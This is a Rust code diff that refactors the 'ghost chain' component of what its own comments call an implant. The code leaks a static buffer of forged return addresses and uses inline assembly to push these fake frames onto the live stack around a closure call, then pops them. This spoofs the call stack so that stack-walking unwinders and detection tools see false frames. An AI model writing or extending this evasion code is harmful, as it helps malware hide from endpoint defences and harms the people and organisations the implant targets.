@@ -53,6 +53,23 @@ pub fn install_ghost_chain(chain: &GhostChain) {
     let len = if len > MAX_GHOST_DEPTH { MAX_GHOST_DEPTH } else { len };
     let src_slice: &[usize] = &chain.frames[..len];
 
+    let Some(buf) = install_ghost_chain_alloc_static(src_slice) else {
+        return;
+    };
+    // Defensive: slab already initialized by extend_from_slice above; this
+    // copy is a no-op overlay guaranteeing the content matches src_slice even
+    // if a future refactor changes the construction path.
+    buf.copy_from_slice(src_slice);
+    CHAIN_FRAMES.store(buf.as_ptr() as usize, Ordering::Release);
+    CHAIN_LEN.store(len, Ordering::Release);
+    CHAIN_READY.store(true, Ordering::Release);
+}
+
+/// Allocate a process-lifetime static buffer holding the ghost frames.
+/// Returns `None` if the allocation didn't satisfy the request (the caller
+/// bails without arming the chain).
+fn install_ghost_chain_alloc_static(src_slice: &[usize]) -> Option<&'static mut [usize]> {
+    let len = src_slice.len();
     // Allocate a static buffer for the frames. The previous code did
     // `Vec::with_capacity(len)` then `as_ptr() as *mut` then `forget(v)` then
     // `from_raw_parts_mut(ptr, len)` then `copy_from_slice` — but
@@ -62,37 +79,28 @@ pub fn install_ghost_chain(chain: &GhostChain) {
     // (extend_from_slice writes len items, setting v.len == len) and only then
     // detach the buffer from the Vec via forget. We also re-check capacity +
     // length after the extend to defend against a degenerate allocator.
-    let buf: &'static mut [usize] = {
-        let mut v: Vec<usize> = Vec::with_capacity(len);
-        v.extend_from_slice(src_slice);
-        // extend_from_slice guarantees v.len() == src_slice.len() == len on
-        // success; if the allocator failed to grow, Vec's grow path aborts
-        // (panic = "abort" here), so we never observe a short write. Defense
-        // in depth: still assert before taking the pointer.
-        if v.capacity() < len || v.len() != len {
-            // Allocation did not satisfy the request — bail without arming the
-            // chain; with_ghost_stack will degrade to a direct f() call.
-            return;
-        }
-        let ptr = v.as_mut_ptr();
-        // SAFETY: v now holds exactly `len` initialized usize slots laid out
-        // contiguously at `ptr`. We transfer ownership to the static slice and
-        // forget the Vec so its destructor does not free the backing store
-        // (the slice now owns it for the process lifetime — the implant never
-        // tears down, matching the leak pattern of GLOBAL_GAP_POOL in
-        // stack.rs). Because the slots were written BEFORE forget, the slice
-        // observes only initialized memory — no UB.
-        let slab = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
-        core::mem::forget(v);
-        slab
-    };
-    // Defensive: slab already initialized by extend_from_slice above; this
-    // copy is a no-op overlay guaranteeing the content matches src_slice even
-    // if a future refactor changes the construction path.
-    buf.copy_from_slice(src_slice);
-    CHAIN_FRAMES.store(buf.as_ptr() as usize, Ordering::Release);
-    CHAIN_LEN.store(len, Ordering::Release);
-    CHAIN_READY.store(true, Ordering::Release);
+    let mut v: Vec<usize> = Vec::with_capacity(len);
+    v.extend_from_slice(src_slice);
+    // extend_from_slice guarantees v.len() == src_slice.len() == len on
+    // success; if the allocator failed to grow, Vec's grow path aborts
+    // (panic = "abort" here), so we never observe a short write. Defense
+    // in depth: still assert before taking the pointer.
+    if v.capacity() < len || v.len() != len {
+        // Allocation did not satisfy the request — bail without arming the
+        // chain; with_ghost_stack will degrade to a direct f() call.
+        return None;
+    }
+    let ptr = v.as_mut_ptr();
+    // SAFETY: v now holds exactly `len` initialized usize slots laid out
+    // contiguously at `ptr`. We transfer ownership to the static slice and
+    // forget the Vec so its destructor does not free the backing store
+    // (the slice now owns it for the process lifetime — the implant never
+    // tears down, matching the leak pattern of GLOBAL_GAP_POOL in
+    // stack.rs). Because the slots were written BEFORE forget, the slice
+    // observes only initialized memory — no UB.
+    let slab = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
+    core::mem::forget(v);
+    Some(slab)
 }
 
 /// Execute `closure` with ghost frames injected onto the stack.
@@ -121,20 +129,40 @@ pub unsafe fn with_ghost_stack<F: FnOnce()>(f: F) {
         return;
     }
 
-    // Clamp the effective depth to MAX_GHOST_DEPTH. install_ghost_chain
-    // already caps the stored length at 32, so for any chain installed by the
-    // fixed code this is a no-op; the clamp exists so a stale/legacy chain (or
-    // a corrupted CHAIN_LEN) cannot drive the push loop and the pop-byte
-    // multiply out of sync. Keeps push count == pop bytes/8 == frames_len.
-    let frames_len = if frames_len_raw > MAX_GHOST_DEPTH {
+    let frames_len = with_ghost_stack_clamp(frames_len_raw);
+
+    // Push ghost frames in reverse order onto the stack.
+    with_ghost_stack_push_frames(frames_ptr, frames_len);
+
+    // Execute the closure. During its execution, the stack has ghost
+    // frames between the closure's frame and the caller's frame.
+    f();
+
+    // Pop ghost frames off the stack (restore RSP).
+    with_ghost_stack_pop_frames(frames_len);
+}
+
+/// Clamp the effective depth to MAX_GHOST_DEPTH. install_ghost_chain
+/// already caps the stored length at 32, so for any chain installed by the
+/// fixed code this is a no-op; the clamp exists so a stale/legacy chain (or
+/// a corrupted CHAIN_LEN) cannot drive the push loop and the pop-byte
+/// multiply out of sync. Keeps push count == pop bytes/8 == frames_len.
+fn with_ghost_stack_clamp(frames_len_raw: usize) -> usize {
+    if frames_len_raw > MAX_GHOST_DEPTH {
         MAX_GHOST_DEPTH
     } else {
         frames_len_raw
-    };
+    }
+}
 
-    // Push ghost frames in reverse order onto the stack.
-    // The unwinder walks from low to high addresses, so the FIRST
-    // ghost it encounters should be the last one we push.
+/// Push ghost frames in reverse order onto the stack.
+/// The unwinder walks from low to high addresses, so the FIRST
+/// ghost it encounters should be the last one we push.
+///
+/// `#[inline(always)]`: the `push` must execute in the caller's frame —
+/// the asm manipulates the live RSP of `with_ghost_stack`.
+#[inline(always)]
+unsafe fn with_ghost_stack_push_frames(frames_ptr: *const usize, frames_len: usize) {
     for i in (0..frames_len).rev() {
         let addr = core::ptr::read(frames_ptr.add(i));
         asm!(
@@ -142,16 +170,18 @@ pub unsafe fn with_ghost_stack<F: FnOnce()>(f: F) {
             in(reg) addr,
         );
     }
+}
 
-    // Execute the closure. During its execution, the stack has ghost
-    // frames between the closure's frame and the caller's frame.
-    f();
-
-    // Pop ghost frames off the stack (restore RSP). Each frame is 8 bytes on
-    // x64. checked_mul so the byte count cannot overflow into a wild
-    // `add rsp, imm` that would corrupt RSP (CRITICAL-9 overflow half).
-    // frames_len is clamped to MAX_GHOST_DEPTH above, so this is always
-    // Some(<=256); the checked_mul is retained as explicit overflow defense.
+/// Pop ghost frames off the stack (restore RSP). Each frame is 8 bytes on
+/// x64. checked_mul so the byte count cannot overflow into a wild
+/// `add rsp, imm` that would corrupt RSP (CRITICAL-9 overflow half).
+/// frames_len is clamped to MAX_GHOST_DEPTH above, so this is always
+/// Some(<=256); the checked_mul is retained as explicit overflow defense.
+///
+/// `#[inline(always)]`: the `add rsp` must run in the caller's frame, after
+/// `with_ghost_stack_push_frames` has pushed exactly `frames_len` frames.
+#[inline(always)]
+unsafe fn with_ghost_stack_pop_frames(frames_len: usize) {
     let pop_bytes = match frames_len.checked_mul(8) {
         Some(b) => b,
         None => return, // unreachable under MAX_GHOST_DEPTH clamp; degrade.
